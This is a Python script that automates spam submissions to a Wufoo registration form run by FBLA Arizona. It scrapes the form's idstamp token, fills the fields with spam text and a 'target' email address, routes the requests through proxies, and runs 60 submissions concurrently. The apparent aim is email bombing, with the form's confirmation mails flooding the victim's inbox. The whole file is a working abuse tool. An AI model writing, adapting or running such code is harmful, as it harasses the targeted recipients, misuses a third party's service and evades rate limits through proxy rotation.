import re
from os.path import basename

import requests

import module
from module import Spam


def get(session: requests.Session):
    headers = {
        'authority': 'wonderpaws.wufoo.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    }

    response = session.get(
        'https://fblaarizona.wufoo.com/forms/xfob2jk13uiyo8/',
        headers=headers
    )
    return response


def post(session: requests.Session, id_stamp, text, target):
    headers = {
        'authority': 'fblaarizona.wufoo.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryT0VrE3E9UslDEVDo',
        'origin': 'https://fblaarizona.wufoo.com',
        'referer': 'https://fblaarizona.wufoo.com/forms/xfob2jk13uiyo8/',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    }

    data = '------WebKitFormBoundaryT0VrE3E9UslDEVDo\r\nContent-Disposition: form-data; name="Field1"\r\n\r\ntest\r\n------WebKitFormBoundaryT0VrE3E9UslDEVDo\r\nContent-Disposition: form-data; name="Field2"\r\n\r\ntest\r\n------WebKitFormBoundaryT0VrE3E9UslDEVDo\r\nContent-Disposition: form-data; name="Field208"\r\n\r\ntest\r\n------WebKitFormBoundaryT0VrE3E9UslDEVDo\r\nContent-Disposition: form-data; name="Field3"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryT0VrE3E9UslDEVDo\r\nContent-Disposition: form-data; name="Field4"\r\n\r\n121\r\n------WebKitFormBoundaryT0VrE3E9UslDEVDo\r\nContent-Disposition: form-data; name="Field4-1"\r\n\r\n212\r\n------WebKitFormBoundaryT0VrE3E9UslDEVDo\r\nContent-Disposition: form-data; name="Field4-2"\r\n\r\n2121\r\n------WebKitFormBoundaryT0VrE3E9UslDEVDo\r\nContent-Disposition: form-data; name="Field6"\r\n\r\nRegion 3 - January 14, 2023 – Grand Canyon University, Phoenix, AZ\r\n------WebKitFormBoundaryT0VrE3E9UslDEVDo\r\nContent-Disposition: form-data; name="Field105"\r\n\r\ntest\r\n------WebKitFormBoundaryT0VrE3E9UslDEVDo\r\nContent-Disposition: form-data; name="Field112"\r\n\r\nDigital Photography: Commercial Photography Portfolio\r\n------WebKitFormBoundaryT0VrE3E9UslDEVDo\r\nContent-Disposition: form-data; name="Field218"\r\n\r\nPledge & Mission\r\n------WebKitFormBoundaryT0VrE3E9UslDEVDo\r\nContent-Disposition: form-data; name="Field311"\r\n\r\nBusiness Ethics \r\n------WebKitFormBoundaryT0VrE3E9UslDEVDo\r\nContent-Disposition: form-data; name="Field412"\r\n\r\nI agree\r\n------WebKitFormBoundaryT0VrE3E9UslDEVDo\r\nContent-Disposition: form-data; name="currentPage"\r\n\r\n1g4EkNVHlHF51dP78ASadaOo54Kuu6PZtheF73ybLUs=\r\n------WebKitFormBoundaryT0VrE3E9UslDEVDo\r\nContent-Disposition: form-data; name="saveForm"\r\n\r\nSubmit\r\n------WebKitFormBoundaryT0VrE3E9UslDEVDo\r\nContent-Disposition: form-data; name="comment"\r\n\r\n\r\n------WebKitFormBoundaryT0VrE3E9UslDEVDo\r\nContent-Disposition: form-data; name="idstamp"\r\n\r\nidstamp_field\r\n------WebKitFormBoundaryT0VrE3E9UslDEVDo\r\nContent-Disposition: form-data; name="encryptedPassword"\r\n\r\n\r\n------WebKitFormBoundaryT0VrE3E9UslDEVDo\r\nContent-Disposition: form-data; name="stats"\r\n\r\n{"errors":0,"startTime":1127,"endTime":15596,"referer":null}\r\n------WebKitFormBoundaryT0VrE3E9UslDEVDo\r\nContent-Disposition: form-data; name="clickOrEnter"\r\n\r\nclick\r\n------WebKitFormBoundaryT0VrE3E9UslDEVDo--\r\n'

    data = data.replace('idstamp_field', id_stamp).replace('test', text).replace('wezxasqw@gmail.com', target)

    response = session.post(
        headers['referer'],
        headers=headers,
        data=data.encode(),
    )
    return response


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        s = requests.Session()
        s.proxies = self.get_proxies()
        get_resp = get(s)
        pattern = re.compile('(?<=name="idstamp" value=").*(?=" >)')
        idstamp = pattern.findall(get_resp.text)
        if not idstamp:
            return
        text = self.get_text()
        post_resp = post(s, idstamp[0], text, target)
        return post_resp


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), 'Thank you')
    res = spam.send_post()
    if res:
        spam.run_concurrently(60)


if __name__ == '__main__':
    main()
